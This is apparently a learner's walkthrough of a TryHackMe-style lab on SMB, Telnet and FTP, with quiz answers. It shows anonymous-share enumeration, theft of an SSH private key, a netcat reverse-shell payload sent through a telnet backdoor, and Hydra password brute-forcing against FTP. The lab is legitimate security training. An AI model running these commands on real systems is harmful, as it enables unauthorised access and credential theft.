# Network Services

## Understanding SMB

SMB - Server Message Block Protocol - is a client-server communication protocol used for sharing access to files, printers, serial ports and other resources on a network

Servers make file systems and other resources (printers, named pipes, APIs) available to clients on the network. Client computers may have their own hard disks, but they also want access to the shared file systems and printers on the servers.

The SMB protocol is known as a response-request protocol, meaning that it transmits multiple messages between the client and server to establish a connection. Clients connect to servers using TCP/IP (actually NetBIOS over TCP/IP as specified in RFC1001 and RFC1002), NetBEUI or IPX/SPX.

NetBEUI, or NetBIOS Enhanced User Interface, is a simple, non-routable networking protocol primarily used in small, local area networks (LANs).

"Non-routable" means that the protocol cannot be used to communicate across different networks through routers.

<img width="534" height="239" alt="image" src="https://github.com/user-attachments/assets/9a88eafd-a3c2-4512-9898-27608bb21dfb" />

Once they have established a connection, clients can then send commands (SMBs) to the server that allow them to access shares, open files, read and write files, and generally do all the sort of things that you want to do with a file system. However, in the case of SMB, these things are done over the network.

**What runs SMB?**

Microsoft Windows operating systems since Windows 95 have included client and server SMB protocol support. Samba, an open source server that supports the SMB protocol, was released for Unix systems.

### Answer the questions below

1. What does SMB stand for?

Server Message Block

2. What type of protocol is SMB?

Response-request

3. What protocol suite do clients use to connect to the server?

TCP/IP

4. What systems does Samba run on?

Unix

## Enumerating SMB

### Enumeration

Enumeration is the process of gathering information on a target in order to find potential attack vectors and aid in exploitation.

Enumeration can be used to gather usernames, passwords, network information, hostnames, application data, services, or any other information that may be valuable to an attacker.

### SMB

Typically, there are SMB share drives on a server that can be connected to and used to view or transfer files. SMB can often be a great starting point for an attacker looking to discover sensitive information.

### Port Scanning

The first step of enumeration is to conduct a port scan, to find out as much information as you can about the services, applications, structure and operating system of the target machine.

### Enum4Linux

Enum4linux is a tool used to enumerate SMB shares on both Windows and Linux systems. It is basically a wrapper around the tools in the Samba package and makes it easy to quickly extract information from the target pertaining to SMB.

The syntax of Enum4Linux is nice and simple: `enum4linux [options] ip`

| **TAG** | **FUNCTION**                                      |
|---------|---------------------------------------------------|
| `-U`    | Get user list                                     |
| `-M`    | Get machine list                                  |
| `-N`    | Get name list dump (different from `-U` and `-M`) |
| `-S`    | Get share list                                    |
| `-P`    | Get password policy information                   |
| `-G`    | Get group and member list                         |
| `-a`    | All of the above (full basic enumeration)         |

### Answer thr questions below

1. Conduct an nmap scan of your choosing, How many ports are open?

3

`nmap MACHINE_IP`

<img width="314" height="112" alt="image" src="https://github.com/user-attachments/assets/e9c7738c-d34e-4caf-9b26-0bd3654e5885" />


2. What ports is SMB running on? Provide the ports in ascending order.

139/445

3. Let's get started with Enum4Linux, conduct a full basic enumeration. For starters, what is the workgroup name?

WORKGROUP

`enum4linux -a MACHINE_IP`

<img width="500" height="62" alt="image" src="https://github.com/user-attachments/assets/0987e22d-9235-4d44-949d-0ac8484d7d97" />

4. What comes up as the name of the machine?

POLOSMB

<img width="500" height="122" alt="image" src="https://github.com/user-attachments/assets/da79f03b-868e-473a-be83-34ceb5471d93" />

5. What operating system version is running?

6.1

6. What share sticks out as something we might want to investigate?

Profiles

## Exploitating SMB

### Types of SMB Exploit

SMB can have serious vulnerabilities like CVE-2017-7494 that allow remote code execution, but in practice, attackers often take advantage of misconfigurations instead. 

One common issue is anonymous SMB share access, where shared folders are left open without requiring a password. This lets anyone connect, browse, and potentially find sensitive files (like configs or credentials). Such information can then be used to escalate access and eventually gain a shell on the system.

### Method Breakdown

So, from our enumeration stage, we know:
- The SMB share location -> `//MACHINE_IP/`
- The name of an interesting SMB share  -> profiles

### SMBClient

Because we're trying to access an SMB share, we need a client to access resources on servers. We will be using SMBClient because it's part of the default samba suite. 

We can remotely access the SMB share using the syntax:

Syntax: `smbclient //[IP]/[SHARE] -U [USERNAME] -p [PORT]`

Example: `smbclient //10.10.10.10/secrets -U Anonymous -p 445`

### SMBClient Commands

Once inside the share, you can view the available commands by typing "help". The most useful of which are:
- `ls` or `dir`: List files and directories
- `cd [DIR]`: Move to a different directory
- `get [FILE]`: Download the file to your AttackBox

### Answer the questions below

1. What would be the correct syntax to access an SMB share called "secret" as user "suit" on a machine with the IP 10.10.10.2 on the default port?

`smbclient //10.10.10.2/secrets -U suit -p 445`

2. Lets see if our interesting share has been configured to allow anonymous access, I.E it doesn't require authentication to view the files. We can do this easily by:
- using the username "Anonymous"
- connecting to the share we found during the enumeration stage
- and not supplying a password.

Does the share allow anonymous access? Y/N?

Y 

`smbclient //MACHINE_IP/profiles -U Anonymous -p 445`

When it asks the passsword, just Enter and see it is accepted.

<img width="365" height="185" alt="image" src="https://github.com/user-attachments/assets/cf0c2748-e1aa-4647-b69b-13c90120cb2f" />

3. Great! Have a look around for any interesting documents that could contain valuable information. Who can we assume this profile folder belongs to?

John Cactus

From the `ls` command we see files and interesting one is 'Working From Home Information.txt'

So downloading this file in local machine `get "Working From Home Information.txt"`

Seeing the contents of this file.

<img width="448" height="131" alt="image" src="https://github.com/user-attachments/assets/25e9342c-178f-4c6c-8285-c8ce82e1ec77" />

4. What service has been configured to allow him to work from home?

`ssh`

5. Okay! Now we know this, what directory on the share should we look in?

`.ssh`

6. This directory contains authentication keys that allow a user to authenticate themselves on, and then access, a server. Which of these keys is most useful to us?

`id_rsa`

Going to the `.ssh` directory it contains:
- `id_rsa` -> The private key. This is the secret part of the SSH key pair.
- `id_rsa.pub` -> The public key. This is the part that gets copied to servers (in authorized_keys).
- `authorized_keys` -> The list of public keys allowed to log into this account. When someone connects via SSH, the server checks if their public key is in this file.

7. Download this file to your local machine, and change the permissions to "600" using "chmod 600 [file]".

Now, use the information you have already gathered to work out the username of the account. Then, use the service and key to log-in to the server.

What is the smb.txt flag?

By `more id_rsa` and `more id_rsa.pub` we see that it contains the private key that can be used when logging in through `ssh` and username as `cactus@POLOSMB`

Getting this file in local machine `get id_rsa`

Giving read and write permissions `chmod 600 id_rsa` and logging in ssh `ssh -i id_rsa cactus@MACHINE_IP`

<img width="269" height="100" alt="image" src="https://github.com/user-attachments/assets/6ba1a50b-542d-4a33-9c1e-78978e4d9b3d" />

## Understanding Telnet

### What is Telnet?

Telnet is an application protocol which allows you, with the use of a telnet client, to connect to and execute commands on a remote machine that's hosting a telnet server.

“With the use of a Telnet client” means you need a Telnet program on your computer to connect to the remote Telnet server.

### Replacement

Telnet sends all messages in clear text and has no specific security mechanisms. 

Thus, in many applications and services, Telnet has been replaced by SSH where transmitted data is encrypted.

Secure Shell (SSH) refers to a cryptographic network protocol used in secure communication between devices. SSH encrypts data using cryptographic algorithms, such as Advanced Encryption System (AES) and is often used when logging in remotely to a computer or server.

### How does Telnet work?

The user connects to the server by using the Telnet protocol, which means entering `telnet` into a command prompt. 

The user then executes commands on the server by using specific Telnet commands in the Telnet prompt. 

You can connect to a telnet server with the following syntax: `telnet [ip] [port]`

### Answer the questions below

1. Is Telnet a client-server protocol (Y/N)?

Y

2. What has slowly replaced Telnet?

SSH

3. How would you connect to a Telnet server with the IP 10.10.10.3 on port 23?

`telnet 10.10.10.3 23`

4. The lack of what, means that all Telnet communication is in plaintext?

Encryption

## Enumerating Telnet

The MACHINE_IP at my time is `10.201.19.174`

### Answer the questions below

1. How many ports are open on the target machine? Note: you may need to scan non-standard ports too.

1

Doing nmap scan to check all the ports `nmap -p- --min-rate 1000 -T4 MACHINE_IP`

<img width="361" height="101" alt="image" src="https://github.com/user-attachments/assets/dc7fd19d-56ff-47db-80d2-94ce57919ac4" />

2. What port is this?

8012

3. This port is unassigned, but still lists the protocol it's using, what protocol is this?

TCP

4. Now re-run the nmap scan, without the -p- tag, how many ports show up as open?

0 

Doing nmap scan without the `-p-` tag `nmap MACHINE_IP`

<img width="332" height="82" alt="image" src="https://github.com/user-attachments/assets/f52dee71-d76b-42f9-92fb-48d4ee693125" />

5. Based on the title returned to us, what do we think this port could be used for?

A Backdoor

Doing nmap scan to check the service and version of this specific port `nmap -sC -sV -p8012 MACHINE_IP`

<img width="359" height="160" alt="image" src="https://github.com/user-attachments/assets/e77876c6-eb09-422a-9e9f-4ccf14adb1e0" />

6. Who could it belong to? Gathering possible usernames is an important step in enumeration.

Skidy

As it says SKIDY'S BACKDOOR so the username is Skidy.

## Exploiting Telnet

### Types of Telnet Exploit

Telnet, being a protocol, is in and of itself insecure for the reasons we talked about earlier. It lacks encryption, so sends all communication over plaintext, and for the most part has poor access control.

There are CVE's for Telnet client and server systems, however, so when exploiting you can check for those on:
- [CVE Details](https://www.cvedetails.com/)
- [Mitre CVE](https://cve.mitre.org/)

A CVE, short for Common Vulnerabilities and Exposures, is a list of publicly disclosed computer security flaws. When someone refers to a CVE, they usually mean the CVE ID number assigned to a security flaw.

### Method Breakdown

So, from our enumeration stage, we know:
- There is a poorly hidden telnet service running on this machine
- The service itself is marked "backdoor"
- We have possible username of "Skidy" implicated

Using this information, let's try accessing this telnet port, and using that as a foothold to get a full reverse shell on the machine!

### Connecting to Telnet

You can connect to a telnet server with the following syntax: `telnet [ip] [port]`

### What is a Reverse Shell?

A shell can be described as a piece of code or program which can be used to gain code or command execution on a device.

A reverse shell is a type of shell in which the target machine communicates back to the attacking machine.

The attacking machine has a listening port, on which it receives the connection, resulting in code or command execution being achieved.

<img width="632" height="165" alt="image" src="https://github.com/user-attachments/assets/a6db3e0e-3240-40c8-ba18-5722331c30b7" />

### Answer the questions below

1. Okay, let's try and connect to this telnet port! If you get stuck, have a look at the syntax for connecting outlined above.

`telnet MACHINE_IP 8012`

<img width="230" height="64" alt="image" src="https://github.com/user-attachments/assets/ada86267-a9a8-46a2-bce7-b58e042deb6a" />

2. Great! It's an open telnet connection! What welcome message do we receive?

SKIDY'S BACKDOOR.

3. Let's try executing some commands, do we get a return on any input we enter into the telnet session? (Y/N)

N

I tried `ls` but it gives nothing

4. Start a tcpdump listener on your local machine.

If using your own machine with the OpenVPN connection, use: `sudo tcpdump ip proto \\icmp -i tun0`

If using the AttackBox, use: `sudo tcpdump ip proto \\icmp -i ens5`

This starts a tcpdump listener, specifically listening for ICMP traffic, which pings operate on.

In linux machine `sudo tcpdump ip proto \\icmp -i tun0`

<img width="358" height="56" alt="image" src="https://github.com/user-attachments/assets/e6f26cea-5107-401b-87d9-473af32655a4" />


5. Now, use the command "ping [local THM ip] -c 1" through the telnet session to see if we're able to execute system commands. Do we receive any pings? Note, you need to preface this with .RUN (Y/N)

Y

Use `.RUN ping YOUR_TUN0_IP -c 1`

<img width="418" height="58" alt="image" src="https://github.com/user-attachments/assets/bb60e830-5224-4c25-9171-18505aab2808" />

This confirms that we can use commands on the telnet machine by putting a listener to get results of that command

6. We're going to generate a reverse shell payload using msfvenom.This will generate and encode a netcat reverse shell for us. Here's our syntax:

`msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R"`
- `-p` = payload
- `lhost` = our local host IP address (this is your machine's IP address)
- `lport` = the port to listen on (this is the port on your machine)
- `R` = export the payload in raw format

What word does the generated payload start with?

mkfifo

Use this on the linux machine to get the payload `msfvenom -p cmd/unix/reverse_netcat lhost=YOUR_TUN0_IP lport=4444 R`

<img width="440" height="74" alt="image" src="https://github.com/user-attachments/assets/477ddbde-fa31-4a5c-ada5-3b2f8ba4c9b4" />

7. Perfect. We're nearly there. Now all we need to do is start a netcat listener on our local machine. We do this using:

`nc -lvnp [listening port]`

What would the command look like for the listening port we selected in our payload?

`nc -lvnp 4444`

8. Great! Now that's running, we need to copy and paste our msfvenom payload into the telnet session and run it as a command. Hopefully- this will give us a shell on the target machine!

Using `.RUN mkfifo /tmp/cqrst; nc YOUR_TUN0_IP 4444 0</tmp/cqrst | /bin/sh >/tmp/cqrst 2>&1; rm /tmp/cqrst` payload in the telnet machine with .RUN

And a listening port in the linux machine `nc -lvnp 4444` 

You get connected to the mahine and get the shell!

9. Success! What is the contents of flag.txt?

<img width="307" height="114" alt="image" src="https://github.com/user-attachments/assets/82027b98-5209-4208-82d9-e2b0dfd06efe" />

## Understanding FTP

### What is FTP?

File Transfer Protocol (FTP) is, as the name suggests , a protocol used to allow remote transfer of files over a network. It uses a client-server model to do this.

### How does FTP work?

A typical FTP session operates using two channels:
- a command (sometimes called the control) channel
- a data channel.

The command channel is used for transmitting commands as well as replies to those commands, while the data channel is used for transferring data.

FTP operates using a client-server protocol. The client initiates a connection with the server, the server validates whatever login credentials are provided and then opens the session.

While the session is open, the client may execute FTP commands on the server.

### Active vs Passive

The FTP server may support either Active or Passive connections, or both. 
- In an Active FTP connection, the client opens a port and listens. The server is required to actively connect to it. 
- In a Passive FTP connection, the server opens a port and listens (passively) and the client connects to it. 

This separation of command information and data into separate channels is a way of being able to send commands to the server without having to wait for the current data transfer to finish. 

If both channels were interlinked, you could only enter commands in between data transfers, which wouldn't be efficient for either large file transfers, or slow internet connections.

### Answer the questions below

1. What communications model does FTP use?

client-server

2. What's the standard FTP port?

21

3. How many modes of FTP connection are there?

2

## Enumerating FTP

### Method

We're going to be exploiting an anonymous FTP login, to see what files we can access- and if they contain any information that might allow us to pop a shell on the system. 

This is a common pathway in CTF challenges, and mimics a real-life careless implementation of FTP servers.

### Alternative Enumeration Methods

It's worth noting  that some vulnerable versions of in.ftpd and some other FTP server variants return different responses to the "cwd" command for home directories which exist and those that don’t. 

This can be exploited because you can issue cwd commands before authentication, and if there's a home directory- there is more than likely a user account to go with it. While this bug is found mainly within legacy systems, it's worth knowing about, as a way to exploit FTP.

The command `cwd` stands for Change Working Directory.

It is commonly seen in FTP (File Transfer Protocol) sessions. When you connect to an FTP server and use `cwd <directory>`, it tells the server that you want to move into that directory, similar to how `cd` works in Linux/Windows shells.

This vulnerability is documented at: [ExploitDB](https://www.exploit-db.com/exploits/20745) 

The FTP daemon included with the Solaris Operating Environment contained a vulnerability that could disclose valid usernames on the system. Normally, a user must log in with a valid account and password before issuing commands; however, due to a flaw in the daemon, it was possible to send a Change Working Directory (CWD) request before authentication was completed. 

When such a request was made, the server’s response differed based on whether the supplied account was valid or not. If the account existed, the daemon prompted for login credentials, but if it did not, the server returned an error indicating that the login name was invalid. 

This difference in responses allowed remote attackers to enumerate valid usernames, making it easier to perform targeted password guessing or brute-force attacks.

### Answer the questions below

1. Run an nmap scan of your choice. How many ports are open on the target machine?

3

Doing nmap scan `nmap -p- --min-rate 1000 -T4 MACHINE_IP`

<img width="350" height="119" alt="image" src="https://github.com/user-attachments/assets/0defe862-0325-4a5a-9a1e-acd24b204894" />

2. What port is ftp running on?

21

3. What variant of FTP is running on it?

vsftpd 

Doing nmap scan to detect the service and version of the specific ftp port `nmap -sC -sV -p21 MACHINE_IP`

<img width="451" height="253" alt="image" src="https://github.com/user-attachments/assets/cc98d139-1401-4146-b8d4-f44c26f1f616" />

4. What is the name of the file in the anonymous FTP directory?

`PUBLIC_NOTICE.txt`

Loggin in to the ftp server `ftp MACHINE_IP` with the username Anonymous and no password by enter

Checking all the files and directories by `ls -a`

<img width="355" height="167" alt="image" src="https://github.com/user-attachments/assets/c4b335bd-74e0-47ac-b9c4-6a8bcf8bfbe0" />

5. What do we think a possible username could be?

Mike

Downloading the `PUBLIC_NOTICE.txt` in local machine by `get PUBLIC_NOTICE.txt` and checking the file by `cat` command.

<img width="257" height="175" alt="image" src="https://github.com/user-attachments/assets/37dc1bea-1cec-4ee3-9c7b-088c314a0e64" />

## Exploiting FTP

### Types of FTP Exploit

Similarly to Telnet, when using FTP both the command and data channels are unencrypted. Any data sent over these channels can be intercepted and read.

With data from FTP being sent in plaintext, if a man-in-the-middle attack took place an attacker could reveal anything sent through this protocol (such as passwords).

When looking at an FTP server from the position we find ourselves in for this machine, an avenue we can exploit is weak or default password configurations.

### Method Breakdown

So, from our enumeration stage, we know:
- There is an FTP server running on this machine
- We have a possible username

Using this information, let's try and bruteforce the password of the FTP Server.

### Hydra

Hydra is a very fast online password cracking tool, which can perform rapid dictionary attacks against more than 50 Protocols, including Telnet, RDP, SSH, FTP, HTTP, HTTPS, SMB, several databases and much more.

The syntax for the command we're going to use to find the passwords is this: 

`hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp`

Let's break it down:
- `hydra`: Runs the hydra tool
- `-t 4`: Number of parallel connections per target
- `-l [user]`: Points to the user who's account you're trying to compromise
- `-P [path to dictionary]`: Points to the file containing the list of possible passwords
- `-vV`: Sets verbose mode to very verbose, shows the login+pass combination for each attempt
- `[machine IP]`: The IP address of the target machine
- `ftp / protocol`: Sets the protocol

### Answer the questions below

1. What is the password for the user "mike"?

password

Running the `hydra` command in local machine `hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV MACHINE_IP ftp`

<img width="411" height="160" alt="image" src="https://github.com/user-attachments/assets/1a5d5011-d0b4-4798-9ebd-b921bf492834" />

2. What is ftp.txt?

Logging in to the ftp server with correcter username mike and password as password.

<img width="304" height="179" alt="image" src="https://github.com/user-attachments/assets/254f27b9-9e1a-416e-b190-c809746a23c4" />
